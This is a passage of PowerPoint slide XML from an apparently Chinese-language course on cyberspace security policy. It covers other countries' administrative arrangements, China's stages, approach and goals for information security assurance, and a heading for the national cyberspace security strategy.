        <p:spPr>
          <a:xfrm>
            <a:off x="502286" y="1482006"/>
            <a:ext cx="8022282" cy="1107996"/>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200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>少数国家在中央政府一级</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>设立机构专门负责处理网络信息安全问题</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，如美国；大多数国家网络空间安全管理职能由不同政府部门的多个机构和单位共同承担；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381710" y="2585085"/>
            <a:ext cx="7776864" cy="1107996"/>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200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>机构单位的设立，以及机构在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全管理中的影响力，受到民防传统、资源配置、历史经验以及决策者对信息安全威胁总体认识程度的影响；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="374229" y="5099965"/>
            <a:ext cx="8022282" cy="769441"/>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200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>现实网络空间安全威胁性质</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>的决定下，前一种观念在大多数国家成为主流</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10301790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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21"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3">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="26"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7"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8" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>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p:cTn id="3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33" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">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p:cTn id="38" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="4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755649"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>分析总结：基本做法</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="1700808"/>
            <a:ext cx="8191500" cy="3024336"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>将网络空间安全视为国家安全的重要组成部分是主流</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>积极推动网络空间安全立法和标准规范建设是主流</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>重视对基础网络和重要信息系统的监管和安全测评是主流</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>普遍重视网络空间安全事件应急响应</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>普遍认识到公共私营合作伙伴关系的重要性，一方面政府加强管理力度，一方面充分利用社会资源</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30078366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08F87C5F-3E43-4589-8FC3-7BAE6DE736C6}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>87</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30723" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="980281" y="1896496"/>
            <a:ext cx="6976095" cy="2801144"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>了解我国网络空间安全保障发展阶段</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>理解我国网络空间安全保障基本思路</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>了解我国网络空间安全保障目标</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>了解我国网络空间安全保障的整体规划</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>了解我国网络空间安全保障体系的框架</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30724" name="Picture 4" descr="j029324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20272" y="4725144"/>
            <a:ext cx="1565275" cy="115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标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1046941" y="746125"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>我国信息安全保障总体情况</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18168744"/>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908720"/>
            <a:ext cx="7344816" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障工作发展阶段</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Group 149"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2087458656"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="539552" y="1772816"/>
          <a:ext cx="8033900" cy="3744416"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1590177">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6443723">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="664735">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="ctr"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1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:srgbClr val="0033CC"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>阶段</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1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:srgbClr val="0033CC"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>主要工作</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75425">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>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en-US" altLang="zh-CN" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>2001-2002</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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>启动</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国家信息化小组重组；</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网络与信息安全协调小组成立</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12168">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>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en-US" altLang="zh-CN" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>2003-2005</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逐步展开</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积极推进</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国家出台指导政策；</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召开第一次全国信息安全保障会议；</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发布国家信息安全战略；</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国家网络与信息安全协调小组召开四次会议</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92088">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>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en-US" altLang="zh-CN" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>2006</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>至今</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深化落实</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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>信息安全法律法规、标准化和人才培养工作取得新成果；</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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>信息安全等级保护和风险评估取得新进展</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452760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a:xfrm>
            <a:off x="847682" y="1484784"/>
            <a:ext cx="7524836" cy="3095674"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>维护国家利益</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>为根本出发点，服从和服务于国家发展和安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>突出</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>保障重点，推动自主创新</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>，为国家发展和社会建设提供有力支撑</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>法律、管理、技术和人才</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>等多方面入手，采取多种安全措施动员和组织全社会力量，共同构建国家网络空间安全保障体系。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32772" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>我国网络空间安全保障</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>基本思路</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30646124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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3277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277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2771">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2771">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="32771">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2771">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2771">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2771">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="32771">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2771">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27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a:xfrm>
            <a:off x="827584" y="1556792"/>
            <a:ext cx="7165354" cy="2663626"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>我国网络空间安全保障目标</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>保障和促进信息化发展</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>维护企业与公民的合法权益</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>构建安全可信的网络信息传播秩序</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>保护互联网知识产权</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32772" name="标题 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="955254" y="692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>我国网络空间安全保障目标</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8104" y="3717032"/>
            <a:ext cx="3403600" cy="2336800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37362122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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="327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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="5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277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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="5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277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2771">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="5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771">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2771">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="32771">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2771">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>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53" presetClass="entr" presetSubtype="16"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17989" y="902677"/>
            <a:ext cx="4179349" cy="433196"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家网络空间安全战略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2215" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="688522" y="1585940"/>
            <a:ext cx="4464684" cy="774058"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>发布时间：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
